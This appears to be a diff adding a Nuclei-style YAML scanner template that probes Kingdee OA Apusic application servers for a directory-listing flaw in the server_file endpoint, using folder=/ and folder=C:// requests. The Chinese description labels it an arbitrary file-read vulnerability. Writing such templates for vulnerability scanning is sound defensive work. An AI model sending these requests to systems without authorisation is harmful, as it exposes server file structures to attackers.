@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - part: body
+          type: word
+          words:
+            - total
+      matchers-condition: and
+      raw:
+        - |
+          GET /appmonitor/protected/selector/server_file/files?folder=/&suffix= HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /appmonitor/protected/selector/server_file/files?folder=C://&suffix= HTTP/1.1
+          Host: {{Hostname}}
+id: kingdee-oa-serverfile-dirlist
+info:
+    author: pphua
+    description: 金蝶OA Apusic应用服务器(中间件) 存在任意文件读取漏洞，攻击者通过漏洞可以获取目录下的文件信息
+    name: 金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞
+    reference:
+        - none
+    severity: medium
+    tags:
+        - kingdee
+        - dirlist
+        - kingdee-OA
